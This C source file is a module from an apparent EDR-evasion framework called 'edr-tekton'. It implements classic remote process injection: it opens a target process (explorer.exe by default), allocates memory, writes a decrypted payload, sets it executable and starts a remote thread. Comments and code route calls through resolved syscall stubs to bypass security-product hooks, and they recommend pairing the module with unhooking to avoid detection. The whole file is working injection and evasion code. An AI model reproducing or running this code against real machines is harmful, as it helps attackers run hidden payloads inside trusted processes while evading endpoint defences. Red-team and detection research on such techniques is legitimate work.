/*
 * edr-tekton :: Classic Remote Injection Module
 * Cat 5.1: OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
 *
 * The most straightforward remote injection technique: open the target,
 * allocate RW memory, write decrypted payload, flip to RX, create thread.
 *
 * Every step is hooked and generates kernel callbacks, so this module
 * is intended for use WITH the syscall engine (Cat 2.x) and unhooking
 * (Cat 2.5/2.6/2.13). Without those layers, detection is near-certain.
 *
 * When ctx->resolved.ssns_resolved is TRUE, the module uses the
 * resolved Nt* function pointers (which bypass hooks via direct/indirect
 * syscalls). Otherwise it falls back to standard WinAPI calls through
 * the utility functions in inject_utils.c.
 *
 * W^X discipline (Cat 4.2): allocate RW, write, then protect RX.
 * Never RWX.
 *
 * Pipeline stage: TEKTON_STAGE_INJECT
 */

#include "tekton/modules/inject.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Internal state ─────────────────────────────────────── */

typedef struct _CLASSIC_INJECT_STATE {
    TEKTON_INJECT_CFG   cfg;
    BOOL                initialized;
} CLASSIC_INJECT_STATE;

/* ── Syscall-aware Nt* wrappers ─────────────────────────── */

/*
 * When SSNs are resolved, call through the resolved function pointers
 * (which route through direct/indirect syscall stubs). Otherwise
 * use the framework utility functions that call WinAPI directly.
 *
 * On Linux dev builds these are all stubs that log and return OK.
 */

#ifdef _WIN32
typedef NTSTATUS (NTAPI *pfnNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, DWORD, DWORD
);
typedef NTSTATUS (NTAPI *pfnNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T
);
typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, DWORD, PDWORD
);
typedef NTSTATUS (NTAPI *pfnNtCreateThreadEx)(
    PHANDLE, DWORD, PVOID, HANDLE, PVOID, PVOID, DWORD, SIZE_T, SIZE_T, SIZE_T, PVOID
);
#endif

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS classic_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    CLASSIC_INJECT_STATE* state = (CLASSIC_INJECT_STATE*)malloc(sizeof(CLASSIC_INJECT_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    /* Defaults */
    strncpy(state->cfg.target_process, "explorer.exe", sizeof(state->cfg.target_process) - 1);
    state->cfg.target_pid = 0;
    state->cfg.create_suspended = FALSE;
    state->cfg.use_syscalls = TRUE;
    state->cfg.allocation_type = MEM_COMMIT | MEM_RESERVE;

    self->private_data = state;

    TLOG_DEBUG("inject_classic: init (target=%s, use_syscalls=%d)",
        state->cfg.target_process, state->cfg.use_syscalls);
    return TEKTON_OK;
}

static TEKTON_STATUS classic_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    CLASSIC_INJECT_STATE* state = (CLASSIC_INJECT_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    /* Use decrypted payload if available, otherwise raw payload */
    BYTE* payload_data = ctx->decrypted.data ? ctx->decrypted.data : ctx->payload.data;
    SIZE_T payload_len = ctx->decrypted.data ? ctx->decrypted.length : ctx->payload.length;

    if (!payload_data || payload_len == 0) {
        TLOG_ERROR("inject_classic: no payload to inject");
        return TEKTON_ERR_INVALID_PARAM;
    }

    if (ctx->dry_run) {
        TLOG_INFO("inject_classic: [DRY RUN] would inject %lu bytes into %s (pid=%lu)",
            (unsigned long)payload_len,
            state->cfg.target_process,
            (unsigned long)state->cfg.target_pid);
        TLOG_INFO("  Method: OpenProcess -> VirtualAllocEx(RW) -> Write -> Protect(RX) -> CreateRemoteThread");
        TLOG_INFO("  use_syscalls=%d, ssns_resolved=%d",
            state->cfg.use_syscalls, ctx->resolved.ssns_resolved);
        return TEKTON_OK;
    }

#ifdef _WIN32
    NTSTATUS nt_status;
    BOOL use_nt = state->cfg.use_syscalls && ctx->resolved.ssns_resolved;

    /* Step 1: Find and open target process */
    DWORD target_pid = state->cfg.target_pid;
    if (target_pid == 0) {
        target_pid = TektonInjectFindProcess(ctx, state->cfg.target_process);
        if (target_pid == 0) {
            TLOG_ERROR("inject_classic: target process '%s' not found",
                state->cfg.target_process);
            return TEKTON_ERR_NOT_FOUND;
        }
        TLOG_DEBUG("inject_classic: found %s at PID %lu",
            state->cfg.target_process, (unsigned long)target_pid);
    }

    DWORD access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                   PROCESS_VM_READ | PROCESS_CREATE_THREAD;

    TEKTON_STATUS open_status = TektonInjectOpenTarget(ctx, target_pid, access);
    if (open_status != TEKTON_OK) {
        TLOG_ERROR("inject_classic: failed to open PID %lu", (unsigned long)target_pid);
        return open_status;
    }

    HANDLE hProcess = ctx->target_handle;
    TLOG_DEBUG("inject_classic: opened PID %lu", (unsigned long)target_pid);

    /* Step 2: Allocate RW memory in target (W^X discipline) */
    PVOID remote_addr = NULL;
    SIZE_T region_size = payload_len;

    if (use_nt && ctx->resolved.fn_nt_allocate_virtual_memory) {
        pfnNtAllocateVirtualMemory pNtAlloc =
            (pfnNtAllocateVirtualMemory)ctx->resolved.fn_nt_allocate_virtual_memory;
        nt_status = pNtAlloc(
            hProcess, &remote_addr, 0, &region_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        );
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_classic: NtAllocateVirtualMemory failed (0x%08lX)",
                (unsigned long)nt_status);
            return TEKTON_ERR_INJECT_FAIL;
        }
    } else {
        TEKTON_STATUS alloc_status = TektonInjectAllocRemote(ctx, payload_len, PAGE_READWRITE);
        if (alloc_status != TEKTON_OK) return alloc_status;
        remote_addr = ctx->remote_base;
    }

    ctx->remote_base = remote_addr;
    TLOG_DEBUG("inject_classic: allocated %lu bytes at %p (RW)",
        (unsigned long)region_size, remote_addr);

    /* Step 3: Write payload to target process */
    if (use_nt && ctx->resolved.fn_nt_write_virtual_memory) {
        pfnNtWriteVirtualMemory pNtWrite =
            (pfnNtWriteVirtualMemory)ctx->resolved.fn_nt_write_virtual_memory;
        SIZE_T bytes_written = 0;
        nt_status = pNtWrite(hProcess, remote_addr, payload_data, payload_len, &bytes_written);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_classic: NtWriteVirtualMemory failed (0x%08lX)",
                (unsigned long)nt_status);
            return TEKTON_ERR_INJECT_FAIL;
        }
    } else {
        TEKTON_STATUS write_status = TektonInjectWriteRemote(ctx, payload_data, payload_len);
        if (write_status != TEKTON_OK) return write_status;
    }

    TLOG_DEBUG("inject_classic: wrote %lu bytes to remote", (unsigned long)payload_len);

    /* Step 4: Flip to RX (W^X, never RWX) */
    if (use_nt && ctx->resolved.fn_nt_protect_virtual_memory) {
        pfnNtProtectVirtualMemory pNtProtect =
            (pfnNtProtectVirtualMemory)ctx->resolved.fn_nt_protect_virtual_memory;
        DWORD old_protect = 0;
        nt_status = pNtProtect(hProcess, &remote_addr, &region_size,
                               PAGE_EXECUTE_READ, &old_protect);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_classic: NtProtectVirtualMemory failed (0x%08lX)",
                (unsigned long)nt_status);
            return TEKTON_ERR_INJECT_FAIL;
        }
    } else {
        /* Fallback: VirtualProtectEx via WinAPI */
        DWORD old_protect = 0;
        if (!VirtualProtectEx(hProcess, remote_addr, payload_len,
                              PAGE_EXECUTE_READ, &old_protect)) {
            TLOG_ERROR("inject_classic: VirtualProtectEx failed");
            return TEKTON_ERR_INJECT_FAIL;
        }
    }

    TLOG_DEBUG("inject_classic: flipped to RX");

    /* Step 5: Create remote thread to execute payload */
    HANDLE hThread = NULL;

    if (use_nt && ctx->resolved.fn_nt_create_thread_ex) {
        pfnNtCreateThreadEx pNtThread =
            (pfnNtCreateThreadEx)ctx->resolved.fn_nt_create_thread_ex;
        nt_status = pNtThread(
            &hThread,               /* ThreadHandle */
            0x1FFFFF,               /* DesiredAccess (THREAD_ALL_ACCESS) */
            NULL,                   /* ObjectAttributes */
            hProcess,               /* ProcessHandle */
            remote_addr,            /* StartRoutine */
            NULL,                   /* Argument */
            0,                      /* CreateFlags (start immediately) */
            0,                      /* ZeroBits */
            0,                      /* StackSize */
            0,                      /* MaximumStackSize */
            NULL                    /* AttributeList */
        );
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_classic: NtCreateThreadEx failed (0x%08lX)",
                (unsigned long)nt_status);
            return TEKTON_ERR_INJECT_FAIL;
        }
    } else {
        hThread = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)remote_addr, NULL, 0, NULL);
        if (!hThread) {
            TLOG_ERROR("inject_classic: CreateRemoteThread failed");
            return TEKTON_ERR_INJECT_FAIL;
        }
    }

    TLOG_INFO("inject_classic: thread created, payload executing in PID %lu at %p",
        (unsigned long)target_pid, remote_addr);

    /* Wait briefly for execution to start, then close thread handle */
    if (ctx->resolved.fn_nt_wait_for_single_object) {
        /* Use resolved wait */
        typedef NTSTATUS (NTAPI *pfnNtWait)(HANDLE, BOOL, PLARGE_INTEGER);
        pfnNtWait pWait = (pfnNtWait)ctx->resolved.fn_nt_wait_for_single_object;
        LARGE_INTEGER timeout;
        timeout.QuadPart = -50000000LL; /* 5 seconds relative */
        pWait(hThread, FALSE, &timeout);
    } else {
        WaitForSingleObject(hThread, 5000);
    }

    if (ctx->resolved.fn_nt_close) {
        typedef NTSTATUS (NTAPI *pfnNtClose)(HANDLE);
        pfnNtClose pClose = (pfnNtClose)ctx->resolved.fn_nt_close;
        pClose(hThread);
    } else {
        CloseHandle(hThread);
    }

    TLOG_INFO("inject_classic: injection complete (%lu bytes into PID %lu)",
        (unsigned long)payload_len, (unsigned long)target_pid);

#else
    /* Linux dev stub */
    TLOG_INFO("inject_classic: [STUB] would inject %lu bytes into %s",
        (unsigned long)payload_len, state->cfg.target_process);
#endif

    return TEKTON_OK;
}

static VOID classic_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(CLASSIC_INJECT_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD classic_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * High risk: every step is hooked and generates kernel callbacks.
     * CreateRemoteThread fires PsSetCreateThreadNotifyRoutine.
     * Cross-process VirtualAllocEx/WriteProcessMemory visible via EtwTi.
     * Use only with syscall engine + unhooking.
     */
    return 45;
}

static BOOL classic_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    (void)ctx;
    return TRUE;
}

/* ── Module definition + auto-registration ──────────────── */

TEKTON_MODULE tekton_mod_inject_classic = {
    .name           = "inject_classic",
    .description    = "Classic remote injection: OpenProcess+Alloc+Write+Thread (Cat 5.1)",
    .category       = TEKTON_CAT_INJECT,
    .target_surface = TEKTON_SURFACE_KERNEL_CB,
    .flags          = TEKTON_MOD_DESTRUCTIVE,
    .skill_ref      = "5.1",
    .init           = classic_init,
    .execute        = classic_execute,
    .cleanup        = classic_cleanup,
    .get_risk_score = classic_risk_score,
    .check_compat   = classic_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_inject_classic);
